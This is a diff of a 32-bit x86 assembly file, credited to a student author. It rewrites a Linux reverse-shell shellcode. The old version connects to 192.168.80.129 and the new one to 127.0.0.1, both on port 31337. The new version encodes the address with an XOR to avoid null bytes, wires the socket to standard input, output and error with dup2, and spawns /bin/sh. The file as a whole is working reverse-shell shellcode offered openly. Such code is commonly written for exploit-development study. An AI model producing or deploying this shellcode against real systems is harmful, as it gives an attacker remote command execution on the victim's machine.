@@ -1,60 +1,64 @@
 BITS 32
-; Simple 
-;
+; Simple reverse shell
+; Reverse shell connecting to 127.0.0.1 port 31337
 ; Written by skuppers: skuppers@student.42.fr
 
 global _start
 
 section .text
-    _start:
-	; s = socket(PF_INET(2), SOCK_STREAM(1), 0)	
-	; for socket calls eax=0x66, ebx specifies syscall, ecx points to args
-	push BYTE 0x66	; socketcall is syscall nb°102 (0x66)
-	pop eax		; put in eax
-	cdq		; Doubles size => edx is nulled
-	xor ebx,ebx	; ebx is type of socketcall
-	inc ebx		; nb°1 = SYS_SOCKET = socket()
-	push edx	; Push arguments (inverted) { proto = 0,
-	push BYTE 0x1	;		     		SOCK_STREAM = 1
-	push BYTE 0x2	;		     		AF_INET = 2 }
-	mov ecx,esp	; ecx points to args
-	int 0x80	; eax holds socket fd
-	mov esi,eax	; save it here for later
+  _start:
+    ; set the frame pointer
+    mov   ebp, esp
 
-	; connect(sockfd, [2, 31337, <ip>], 16)
-	push BYTE 0x66
-	pop eax
-	inc ebx			; ebx = 2
-	push DWORD 0x8150a8c0	; IP ADDR here	<192.168.80.129>
-	push WORD 0x697a	; port 31337
-	push WORD bx		; AF_INET = 2
-	mov ecx,esp
-	push BYTE 16		; 16
-	push ecx		; struct
-	push esi		; sockfd
-	mov ecx,esp
-	inc ebx			; 3 = SYS_CONNECT = connect()
-	int 0x80		; eax is new connection fd
+    ; clear required registers
+    xor   eax, eax
+    xor   ecx, ecx
+    xor   edx, edx
 
-	; dup2(sockfd, {stdin, out, err })
-	xchg eax,ebx		; switch connection_fd and 3
-	push BYTE 0x2		; ecx = 2
-	pop ecx
-      dup_loop:			; for loop
-	mov BYTE al, 0x3F	; Syscall nb°63 dup2
-	int 0x80		; dup2(connection_fd, ecx(2,1,0))
-	dec ecx			; --ecx
-	jns dup_loop		; if ecx > 0
+    ; create sockaddr_in struct
+    push  eax
+    push  eax             ; [$esp]: 8 bytes of padding
+    mov   eax, 0xffffffff
+    mov   ebx, 0xfeffff80
+    xor   ebx, eax
+    push  ebx             ; [$esp]: 127.0.0.1
+    push  word 0x697a     ; [$esp]: 31337
+    push  word 0x02       ; [$esp]: AF_INET
 
-	; execve(char *path, char *argv[], char *envp[])
-	mov BYTE al, 11		; syscall 11
-	xor edx,edx
-	push edx		; Push null
-	push 0x68732f2f		; //sh
-	push 0x6e69622f		; /bin
-	mov ebx, esp		; push '/bin//sh'
-	push edx
-	mov edx, esp		; empty envp
-	push ebx		; '/bin//sh' as arg -> convention
-	mov ecx,esp		; argv
-	int 0x80
+    ; call socket(domain, type, protocol)
+    xor   eax, eax
+    xor   ebx, ebx
+    mov   ax, 0x167       ; $eax: 0x167 / 359
+    mov   bl, 0x02        ; $ebx: AF_INET
+    mov   cl, 0x01        ; $ecx: SOCK_STREAM
+    int   0x80
+    mov   ebx, eax        ; $ebx: socket file descriptor
+
+    ; call connect(sockfd, sockaddr, socklen_t)
+    mov   ax, 0x16a
+    mov   ecx, esp
+    mov   edx, ebp
+    sub   edx, esp        ; $ecx: size of the sockaddr struct
+    int   0x80
+
+    ; call dup2 to redirect STDIN, STDOUT and STDERR
+    xor   ecx, ecx
+    mov   cl, 0x3
+    dup:
+    xor   eax, eax
+    mov   al, 0x3f
+    dec   ecx
+    int   0x80
+    inc   ecx
+    loop  dup
+
+    ; spawn /bin/sh using execve
+    ; $ecx and $edx are 0 at this point
+    xor   eax, eax
+    xor   edx, edx
+    push  eax
+    push  0x68732f2f
+    push  0x6e69622f
+    mov   ebx, esp        ; [$ebx]: null terminated /bin//sh
+    mov   al, 0x0b
+    int   0x80
